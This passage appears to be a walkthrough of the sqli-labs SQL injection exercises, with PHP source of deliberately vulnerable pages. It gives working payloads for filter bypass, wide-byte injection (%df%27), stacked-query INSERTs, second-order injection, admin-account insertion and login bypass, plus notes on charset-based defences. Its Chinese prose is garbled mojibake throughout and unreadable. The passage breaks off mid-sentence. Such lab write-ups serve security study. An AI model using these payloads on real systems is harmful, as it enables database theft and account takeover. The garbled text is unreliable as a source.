æ–‡ä»¶éœ€è¦è¯´ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•éœ€è¦mysqlæ•°æ®åº“å¼€å¯secure-file-privå†™æ–‡ä»¶æƒé™ï¼Œå¦åˆ™ä¸èƒ½å†™å…¥æ–‡ä»¶ã€‚ å¦‚æœä½ ä½¿ç”¨çš„æ—¶phpstudyï¼Œæˆ–è€…xammpè¯·ä¿®æ”¹å…¶è‡ªå·±çš„ç¯å¢ƒé‡Œçš„mysqlé…ç½®æ–‡ä»¶ã€‚ è¿›å…¥mysqlå®‰è£…ç›®å½•ï¼Œæ‰¾åˆ°my.ini ä¿®æ”¹é‡Œé¢çš„secure-file-privå‚æ•° å¦‚æœå‘ç°æ²¡æœ‰secure_file_privè¿™ä¸ªé€‰é¡¹ï¼Œç›´æ¥å†æœ€åæ·»åŠ ä¸€ä¸ªç©ºçš„å³å¯ã€‚ å¦‚æœå¼•å·ä¸­æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„çš„è¯ï¼Œå¯¼å…¥/å‡ºçš„æ–‡ä»¶è·¯å¾„ä¼šå†è¿™ä¸ªè·¯å¾„ä¸‹ã€‚ ç›¸å…³å‡½æ•°ï¼šload_file()å¯¼å‡ºæ–‡ä»¶ load date infile selectâ€¦â€¦into outfile â€˜file_nameâ€™ less 8-10 ç›²æ³¨è·Ÿ5,6çš„æºç ä¸€æ ·,åªæ˜¯æ³¨é‡Šæ‰äº†print_r(mysql_error()); å¯¼è‡´ä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ less 11-14 union postå¹³å¹³æ— å¥‡çš„post åç«¯ä»£ç ï¼š@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;; less 15-16 æ—¶é—´ç›²æ³¨less 17æºç å¾ˆæœ‰æ„æ€,ä½¿ç”¨äº†ä¸€ä¸ªfunction check_input($value)å‡½æ•°æ¥æ£€æµ‹è¾“å…¥æ˜¯å¦åˆæ³• function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); //é™åˆ¶å­—ç¬¦ä¸²é•¿åº¦ } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) //æ£€æŸ¥å­—ç¬¦ä¸²é‡Œçš„å­—ç¬¦æ˜¯ä¸æ˜¯éƒ½æ˜¯æ•°å­—,æ˜¯è¿”å›trueï¼Œä¸æ˜¯è¿”å›falseã€‚ { $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;//å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ } else { $value = intval($value); } return $value; } æ„Ÿè§‰æŒºå¤æ‚çš„,ä¸çŸ¥é“ä»¥åèƒ½ä¸èƒ½ç»•è¿‡è¿™ä¸ªå‡½æ•° ç„¶åçœ‹åé¢,å› ä¸ºpasswdæ²¡æœ‰è¿›è¡Œè¿‡æ»¤,å¹¶ä¸”åé¢è¾“å‡ºäº†æŠ¥é”™ä¿¡æ¯,å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥, è‹¥æ²¡æœ‰æŠ¥é”™ä¿¡æ¯,è¿˜å¯ä»¥ä½¿ç”¨updateæ³¨å…¥,updateå‚æ•°å¯æ§, update users set password=â€˜1â€™ ,id=â€™xxxâ€™ where username=â€™adminâ€™; å¯ä»¥æ›´æ”¹å¤šä¸ªå­—æ®µæ•°æ® less 18,19 $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; echo &quot;$uagent&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;$insert&quot;; mysql_query($insert); //echo &#39;Your IP ADDRESS is: &#39; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;; echo &#39;Your User Agent is: &#39; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); //è¾“å‡ºæŠ¥é”™ä¿¡æ¯ echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;; echo &quot;&lt;br&gt;&quot;; } else { echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;; echo &quot;&lt;/font&gt;&quot;; } å› ä¸ºè¾“å‡ºäº†æŠ¥é”™ä¿¡æ¯,æ‰€ä»¥å¯ä»¥æŠ¥é”™æ³¨å…¥ æ­¤å¤–,INSERTå‚æ•°å¯æ§è¿˜æœ‰ä»¥ä¸‹æ³¨å…¥æ–¹å¼ inertæ³¨å…¥1.æ³¨å…¥ç‚¹ä½äºtbl_nameåŸå¥ï¼šinsert into {tbl_name} values(2,2,2,2); æ³¨å…¥ï¼šinsert into {wp_user values(2,&#39;newadmin&#39;,&#39;newpasswd&#39;)#} values(2,2,2,2); 2.æ³¨å…¥ç‚¹ä½äºvaluesINSERT INTO wp_user VALUES(1,1,{xxxxx}); INSERT INTO wp_user VALUES(1,1,1),(2,1,&quot;aaaaa&quot;); //ç¬¬äºŒä¸ªå­—æ®µè‹¥ä¸ºç®¡ç†å‘˜æ ‡è¯†ç¬¦,ä¾¿å¯ä»¥æ·»åŠ ç®¡ç†å‘˜ INSERT INTO wp_user VALUES(1,1,1),(2,2,(select pwd from wp_user limit 1)); //æœ€åä¸€ä¸ªå­—æ®µå¯ä»¥æ˜¾ç¤º less 20-22å…³äºcookieçš„,ä¼šæŠŠcookieå­˜å…¥æ•°æ®åº“,ç„¶åå†æ¬¡è®¿é—®æ—¶å–å‡º less 23åŠ äº†æ›¿æ¢,å°†#å’Œâ€“æ³¨é‡Šç¬¦ç»™æ›¿æ¢æ‰äº† $reg = &quot;/#/&quot;; $reg1 = &quot;/--/&quot;; $replace = &quot;&quot;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); è¿™é‡Œç›´æ¥ç»™å‡ºpayload:0&#39; union select 1,2,3 and &#39;1&#39;=&#39;1 å¯ä»¥è‡ªå·±æ‰‹åŠ¨é—­åˆåé¢çš„å•å¼•å· less 24äºŒæ¬¡æ³¨å…¥:å¼€å‘è€…ä¿¡ä»»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®æ˜¯æ— å®³çš„ï¼Œå½“æˆ‘ä»¬å¼•ç”¨æ•°æ®åº“é‡Œçš„æ•°æ®æ—¶,é€ æˆäº†äºŒæ¬¡æ³¨å…¥ è¿™é‡Œæˆ‘ä»¬åˆ›å»ºäº†ç”¨æˆ·adminâ€™#ï¼Œç„¶ååœ¨ä¿®æ”¹å¯†ç å,å´æŠŠadminçš„å¯†ç ç»™ä¿®æ”¹äº† æºç : $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; less 25function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) return $id; } å°†orå’Œandæ›¿æ¢ä¸ºäº†ç©º,å¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡,æˆ–è€…å¯ä»¥é‡‡ç”¨&amp;&amp;å’Œ|| 1%27%20aandnd%201â€“%20- less 26function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out -- $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out # $id= preg_replace(&#39;/[\\s]/&#39;,&quot;&quot;, $id); //Strip out spaces $id= preg_replace(&#39;/[\\/\\\\\\\\]/&#39;,&quot;&quot;, $id); //Strip out slashes æ–œæ  return $id; } å¥½å®¶ä¼™,åˆè¿‡æ»¤äº†æ–œæ å’Œç©ºæ ¼,ä½†æ˜¯ç©ºæ ¼æœ‰å¾ˆå¤šç§æ–¹å¼ç»•è¿‡ å¦‚URLç¼–ç : %0a,%0b,%0c,%0d,%09,%a0 /**/ç»„åˆ æ‹¬å· è¿™é‡Œéœ€è¦linuxç¯å¢ƒæ‰èƒ½ä½¿ç”¨è¿™äº›ç‰¹æ®Šå­—ç¬¦ä¸²,å› ä¸ºæˆ‘æ˜¯åœ¨windowsä¸‹æ­çš„,å°±æ‡’å¾—æœ¬åœ°æµ‹è¯•äº† less 27function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id); //Strip out union $id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id); //Strip out select $id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION $id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id); //Strip out SELECT $id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id); //Strip out Union $id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id); //Strip out select return $id; } åˆè¿‡æ»¤äº†unionå’Œselect,ä¾æ—§åŒå†™,è€Œä¸”ä¼¼ä¹å¯ä»¥å¤§å°å†™ç»•è¿‡ less 28function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT. return $id; } è¿‡æ»¤äº†union+selectç»„åˆ,å› ä¸ºæ›¿æ¢ä¸ºç©º,ä»ç„¶åŒå†™ç»•è¿‡ union union select select åˆæˆ–è€… ä½¿ç”¨ç›²æ³¨ less 29-31 ä¸€ä¸ªç®€å•çš„wafåˆæ²¡åš,å› ä¸ºå¥½åƒè¦æ­ç¯å¢ƒ(äººå¤ªæ‡’äº†) less 32 -34å®½å­—èŠ‚æ³¨å…¥å› æ­¤æˆ‘ä»¬åœ¨æ­¤æƒ³åŠæ³•å°† â€˜ å‰é¢æ·»åŠ çš„ \\ é™¤æ‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š 1ã€%df åƒæ‰ \\ å…·ä½“çš„åŸå› æ˜¯ urlencode(â€˜) = %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27 å‰é¢æ·»åŠ %dfï¼Œå½¢ æˆ%df%5c%27ï¼Œè€Œä¸Šé¢æåˆ°çš„ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤ äº‹%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚ 2ã€å°† \\â€™ ä¸­çš„ \\ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 çš„æƒ…å†µï¼Œåé¢çš„%5c ä¼šè¢«å‰é¢çš„%5c ç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³•ã€‚ ä½¿ç”¨UTF-16ç¼–ç  function check_addslashes($string) { $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\\\&#39;) .&#39;/&#39;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#39;/\\&#39;/i&#39;, &#39;\\\\\\&#39;&#39;, $string); //escape single quote with a backslash $string = preg_replace(&#39;/\\&quot;/&#39;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string; } è¿™é¢˜å¢åŠ äº†ä¸ªcheckå‡½æ•°,ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…è½¬ä¹‰äº†\\ï¼Œç„¶åä¼šåœ¨&#39;å’Œ&quot;å‰é¢åŠ ä¸Šæ–œæ ,å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ //å®½å­—èŠ‚æ³¨å…¥çš„æ¡ä»¶æ˜¯æ”¯æŒGDKç¼–ç  payloadï¼š?id=-1%df%27 UNion seleCt 1,2,DATABASE()--+ ç¬¬33å…³å°†getæ”¹ä¸ºäº†postè¯·æ±‚ è¿™é‡Œè¦æ³¨æ„å¦‚æœä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥çš„è¯éœ€è¦ç”¨burpæŠ“åŒ…,å› ä¸ºæˆ‘ä»¬çš„%dfä¸­çš„%ä¼šè¢«urlç¼–ç ,è€Œä¸”æˆ‘ç›´æ¥ä½¿ç”¨repeateræ¨¡å—è¿˜æ— æ³•çœ‹åˆ°è¿”å›ç»“æœ,å°±å¾ˆç–‘æƒ‘ payloadï¼šuname=admin%df&#39; union select 1,2-- -&amp;passwd=admin&amp;submit=Submit å½“ç„¶è¿˜æœ‰ä¸€ç§æ–¹æ³•:å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œä¾‹å¦‚å°† â€˜ è½¬ä¸ºutf-16ä¸ºï¿½â€™ ã€‚ å®½å­—èŠ‚æ³¨å…¥çš„é˜²æŠ¤é¦–å…ˆæˆ‘ä»¬éœ€è¦è¿‡æ»¤æ‰\\ï¼Œä¸ç„¶å°±å¯ä»¥å¯ä»¥ä½¿ç”¨ç¬¬äºŒç§æ€è·¯ç»•è¿‡ è¿‡æ»¤æ–œæ å,æˆ‘ä»¬ä¾æ—§å¯ä»¥ä½¿ç”¨%dfçš„æ–¹å¼è¿›è¡Œç»•è¿‡ Addslashes()å‡½æ•°å’Œæˆ‘ä»¬åœ¨ 32 å…³å®ç°çš„åŠŸèƒ½åŸºæœ¬ä¸€è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾æ—§å¯ä»¥åˆ©ç”¨%df è¿›è¡Œç»• è¿‡ã€‚Noticeï¼šä½¿ç”¨ addslashes(),æˆ‘ä»¬éœ€è¦å°† mysql_query è®¾ç½®ä¸º binary çš„æ–¹å¼ï¼Œæ‰èƒ½é˜²å¾¡æ­¤æ¼æ´ã€‚ Mysql_query(â€œSET character_set_connection=gbk,character_set_result=gbk,character_set_client=binaryâ€,$conn); åœ¨PHPè¯­è¨€æƒ…å†µä¸‹ å¯ä»¥é˜²æ­¢ä¸€äº›SQLè¯¸å¦‚ æ¯”å¦‚æˆ‘åœ¨ä½ çš„ç™»é™†çª—å£å†™ â€œç”¨æˆ·åâ€=%dc%27%20or%201=1%20limit%201%20/*&amp;amp; â€œå¯†ç â€=88888*/%23 å°±æœ‰å¯èƒ½ç›´æ¥ç™»é™†ä½ åå° ä½†æ˜¯ä½ å¦‚æœè®¾ç½®äº†SET character_set_client = binary MYSQL å°±ä¼šä»¥äºŒè¿›åˆ¶å‘é€ ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ åœ¨ä½¿ç”¨ mysql_real_escape_string()æ—¶ï¼Œå¦‚ä½•èƒ½å¤Ÿå®‰å…¨çš„é˜²æŠ¤è¿™ç§é—®é¢˜ï¼Œéœ€è¦å°† mysql è®¾ç½®ä¸º gbk å³å¯ã€‚ è®¾ç½®ä»£ç ï¼š Mysql_set_charset(â€˜gbkâ€™,â€™$connâ€™) è¦é¿å¼€mysql_real_escape_stringå¯èƒ½çš„é£é™©ï¼Œæœ‰ä»¥ä¸‹ç­–ç•¥ 1ï¼‰æ•°æ®åº“è¡¨ä½¿ç”¨çš„ç¼–ç ä¸æ•°æ®åº“å˜é‡character_set_clientæŒ‡å®šçš„ç¼–ç ç›¸åŒï¼Œè¿™æ ·ä¸éœ€è¦set names xxxæ¥æ”¹å˜ç¼–ç ã€‚ 2ï¼‰æ•°æ®åº“è¡¨ä½¿ç”¨latin1æˆ–utf8ç­‰å­—ç¬¦é›†ï¼Œè¿™æ ·set names xxxä¹Ÿä¸ä¼šå¸¦æ¥é¢å¤–çš„é£é™©ã€‚ 3ï¼‰å½“éœ€è¦set names gbkæ—¶ï¼Œä½¿ç”¨mysql_set_charsetæ¥æ›¿ä»£ã€‚ å†æ¬¡åˆ†æä»£ç ,PHPå®¢æˆ·ç«¯ç”¨çš„æ˜¯UTF-8ç¼–ç ,è€Œmysqlç”¨çš„æ˜¯gbkç¼–ç , less 35ç”¨äº†addslashes å‡½æ•°åœ¨æŒ‡å®šçš„é¢„å®šä¹‰å­—ç¬¦å‰æ·»åŠ åæ–œæ ã€‚è¿™äº›å­—ç¬¦æ˜¯å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿ä¸NULLã€‚ $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; è¿™é¢˜å®ƒidæ²¡æœ‰è¢«å•å¼•å·åŒ…è£¹,æ‰€ä»¥è¯´addslasheså‡½æ•°æ²¡æœ‰ä½œç”¨,ç›´æ¥ç»•å°±è¡Œ less 36-37è¿˜æ˜¯æ–œæ è½¬ä¹‰,å¯èƒ½æ˜¯æƒ³ç»™æˆ‘ä»¬ä»‹ç»ä¸€äº›ä¸åŒçš„è½¬ä¹‰å‡½æ•°å§,å…¶å®ç»•è¿‡æ–¹æ³•éƒ½æ˜¯ä¸€æ ·çš„ mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š \\x00 \\n \\r \\ &#39; &quot; \\x1a 37 post,è€æ–¹æ³• less 38-41å †å æ³¨å…¥&lt;?php // take the variables if(isset($_GET[&#39;id&#39;])) { $id=$_GET[&#39;id&#39;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;); fwrite($fp,&#39;ID:&#39;.$id.&quot;\\n&quot;); fclose($fp); // connectivity //mysql connections for stacked query examples. $con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname); // Check connection if (mysqli_connect_errno($con1)) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } else { @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;); } $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; /* execute multi query */ if (mysqli_multi_query($con1, $sql)) { /* store first result set */ if ($result = mysqli_store_result($con1)) //å¦‚æœå½“å‰æ‰§è¡Œçš„æŸ¥è¯¢å­˜åœ¨å¤šä¸ªç»“æœï¼Œè¿”å›â€œçœŸâ€ï¼Œè€Œä¸”åº”ç”¨ç¨‹åºå¿…é¡»è°ƒç”¨mysql_next_result()æ¥è·å–ç»“æœã€‚ { if($row = mysqli_fetch_row($result)) // å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œï¼Œå¹¶ä½œä¸ºæšä¸¾æ•°ç»„è¿”å›ã€‚ { var_dump($row); echo &#39;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#39;; // printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; // printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } mysqli_free_result($result); //å‡½æ•°é‡Šæ”¾ç»“æœå†…å­˜ } /* print divider */ if (mysqli_more_results($con1)) //å‡½æ•°æ£€æŸ¥ä¸€ä¸ªå¤šæŸ¥è¯¢æ˜¯å¦æœ‰æ›´å¤šçš„ç»“æœã€‚ { //printf(&quot;-----------------\\n&quot;); } //while (mysqli_next_result($con1)); //è€Œä¸”åº”ç”¨ç¨‹åºå¿…é¡»è°ƒç”¨mysql_next_result()æ¥è·å–ç»“æœã€‚ } else { echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; } /* close connection */ mysqli_close($con1); } mysqli_multi_query() æ”¯æŒåŒæ—¶æŸ¥è¯¢å¤šæ¡æ•°æ® è¿™é¢˜æ— æ³•è¾“å‡ºç¬¬äºŒä¸ªè¯­å¥é‡Œé¢çš„å†…å®¹,å¸Œæœ›åé¢èƒ½é‡åˆ°èƒ½è¾“å‡ºç¬¬äºŒä¸ªè¯­å¥å†…å®¹çš„å…³å¡,è®©æˆ‘å¯¹æ¯”ä¸€ä¸‹ä¸¤è€…çš„ä»£ç ;ä½†æ˜¯ç¬¬äºŒæ¡è¯­å¥æ˜¯å¯ä»¥æ‰§è¡Œçš„;å¯ä»¥ä½¿ç”¨insertè¯­å¥å°†å°†æƒ³è¦çš„ä¿¡æ¯è¾“å…¥æ’å…¥åˆ°usersè¡¨ä¸­ payload: ?id=1%df&#39;;insert into users values(99,database(),version()); ?id=99 less 39,æ•´å½¢ 41å’Œ39çš„åŒºåˆ« 39ä¼šè¾“å‡ºæŠ¥é”™ä¿¡æ¯,å…¶å®å¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥ less 42è¿›æ¥ä¹‹åæ˜¯ä¸€ä¸ªç™»å½•æ¡† è·ŸäºŒæ¬¡æ³¨å…¥é‚£ä¸ªä¸€æ¨¡ä¸€æ ·,ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½è‡ªå·±new user æºç : å¯¹usernameè¿›è¡Œäº†mysqli_real_escape_string()å‡½æ•°è¿›è¡Œæ£€æŸ¥,è€Œä¸”PHPå®¢æˆ·ç«¯å’Œæ•°æ®åº“éƒ½æ˜¯UTF-8ç¼–ç ,æ‰€ä»¥ä¸å­˜åœ¨å®½å­—èŠ‚ç»•è¿‡,ä½†æ˜¯å®ƒåˆæ²¡æœ‰å¯¹passwordè¿›è¡Œå¤„ç†,å†passwordä¸Šé¢å°±å­˜åœ¨æ³¨å…¥ æˆ‘åŸæœ¬éƒ½ä»¥ä¸ºè¿™æ˜¯ä½¿ç”¨å †å æ³¨å…¥è¶Šæƒnewä¸€ä¸ªadminâ€™#ç”¨æˆ·æ¥è¿›è¡ŒäºŒæ¬¡æ³¨å…¥çš„,ä½†æ˜¯å´ç”¨ä¸äº†,åŸå› æ˜¯å› ä¸º: ä¹‹å‰æåˆ°çš„usernameè¿›è¡Œäº†mysqli_real_escape_string()å‡½æ•°è¿›è¡Œè¿‡æ£€æŸ¥,è™½ç„¶æˆ‘ä»¬èƒ½newä¸€ä¸ªæ–°ç”¨æˆ·,ä½†æ˜¯æˆ‘ä»¬å…¶å®åœ¨ç™»é™†æ—¶æœ¬èº«å•å¼•å·å°±ä¼šè¿›è¡Œè½¬ä¹‰å‘€ï¼ï¼ less 43 æ¢äº†ç§é—­åˆæ–¹å¼,ç„¶å44ï¼Œ45å–æ¶ˆäº†æŠ¥é”™,æ‰€ä»¥ä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†,åªèƒ½ç›²æ³¨ å¸¸ç”¨é—­åˆæ–¹å¼åˆ¤æ–­åˆ¤æ–­é—­åˆæ–¹å¼ï¼Œç›®å‰æŒæ¡çš„é—­åˆæ–¹å¼ä¸ºå•å¼•å·â€™â€™ï¼Œå•å¼•å·æ‹¬å·(â€™â€™)ï¼ŒåŒå¼•å·â€â€ï¼ŒåŒå¼•å·æ‹¬å·(â€œâ€) å½“å•å¼•å·æˆ–è€…åŒå¼•å·å‡ºç°å›æ˜¾æˆ–è€…è¯­æ³•é”™è¯¯æ—¶ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦å¸¦æ‹¬å·å‘¢ï¼Ÿ é‡åˆ°SQLæ³¨å…¥ç¬¬ä¸€æ­¥åˆ¤æ–­é—­åˆï¼šé¦–å…ˆå°è¯•ï¼š ?id=1â€™ ?id=1â€ 12 1å¦‚æœéƒ½æŠ¥é”™ï¼Œåˆ™ä¸ºæ•´å½¢é—­åˆã€‚ 2å¦‚æœå•å¼•å·æŠ¥é”™ï¼ŒåŒå¼•å·ä¸æŠ¥é”™ã€‚ç„¶åå°è¯• ?id=1&#39; --+ ?id=1&#39; # 12 æ— æŠ¥é”™åˆ™å•å¼•å·é—­åˆã€‚æŠ¥é”™åˆ™å•å¼•å·åŠ æ‹¬å·ã€‚ 3å¦‚æœå•å¼•å·ä¸æŠ¥é”™ï¼ŒåŒå¼•å·æŠ¥é”™ã€‚ç„¶åå°è¯• ?id=1&quot; --+ ?id=1&quot; # 12 æ— æŠ¥é”™åˆ™åŒå¼•å·é—­åˆã€‚æŠ¥é”™åˆ™åŒå¼•å·åŠ æ‹¬å·ã€‚ 1 è¾“å…¥ï¼ˆå…¶ä¸­id=1,1æ˜¯æ­£ç¡®çš„æ•°æ®åº“å­˜åœ¨çš„å€¼ï¼‰ï¼Œæ­£å¸¸å›æ˜¾ ?id=1 and true --+ æˆ–è€… ?id=true and true --+ 123 è¾“å…¥ï¼Œé”™è¯¯å›æ˜¾ ?id=1 and false --+ æˆ–è€… ?id=true and false --+ 123 é‚£ä¹ˆå°±æ˜¯æ•´å½¢é—­åˆ 2 è¾“å…¥ï¼ˆå…¶ä¸­id=1,1æ˜¯æ­£ç¡®çš„æ•°æ®åº“å­˜åœ¨çš„å€¼ï¼‰ï¼Œæ­£å¸¸å›æ˜¾ ?id=1â€™ and true --+ æˆ–è€… ?id=trueâ€˜ and true --+ 123 è¾“å…¥ï¼Œé”™è¯¯å›æ˜¾ ?id=1â€™ and false --+ æˆ–è€… ?id=trueâ€˜ and false --+ 123 é‚£ä¹ˆå°±æ˜¯å•å¼•å·é—­åˆï¼Œå…¶ä»–ç¬¦å·åŒç† å•å¼•å·è½¬ä¹‰ç»•è¿‡å½“æ—¶ç”¨å•å¼•å·â€™ï¼Œä»£ç è½¬ä¹‰ä¸º\\â€™ï¼Œå°±ä½¿ç”¨å¦‚ä¸‹æ–¹å¼æ›¿æ¢æ‰å•å¼•å· %df%27 ï¿½&#39; %EF%BF%BD 123 ä¸‡èƒ½å¯†ç  ï¿½&#39; and1=1 # 1 database()è¿”å›å½“å‰æ•°æ®åº“å version()è¿”å›æ•°æ®åº“çš„ç‰ˆæœ¬å· CONCAT(s1,s2â€¦sn)å­—ç¬¦ä¸² s1,s2 ç­‰å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² CONCAT_WS(x, s1,s2â€¦sn)åŒ CONCAT(s1,s2,â€¦) å‡½æ•°ï¼Œä½†æ˜¯æ¯ä¸ªå­—ç¬¦ä¸²ä¹‹é—´è¦åŠ ä¸Š xï¼Œx å¯ä»¥æ˜¯åˆ†éš”ç¬¦ LIMITmysql&gt; SELECT * FROM table LIMIT 5,10; // æ£€ç´¢è®°å½•è¡Œ 6-15 //ä¸ºäº†æ£€ç´¢ä»æŸä¸€ä¸ªåç§»é‡åˆ°è®°å½•é›†çš„ç»“æŸæ‰€æœ‰çš„è®°å½•è¡Œï¼Œå¯ä»¥æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º -1ï¼š mysql&gt; SELECT * FROM table LIMIT 95,-1; // æ£€ç´¢è®°å½•è¡Œ 96-last. //å¦‚æœåªç»™å®šä¸€ä¸ªå‚æ•°ï¼Œå®ƒè¡¨ç¤ºè¿”å›æœ€å¤§çš„è®°å½•è¡Œæ•°ç›®ï¼š mysql&gt; SELECT * FROM table LIMIT 5; //æ£€ç´¢å‰ 5 ä¸ªè®°å½•è¡Œ //æ¢å¥è¯è¯´ï¼ŒLIMIT n ç­‰ä»·äº LIMIT 0,nã€‚ 123456789 sleepleftLEFT(s,n) è¿”å›å­—ç¬¦ä¸² s çš„å‰ n 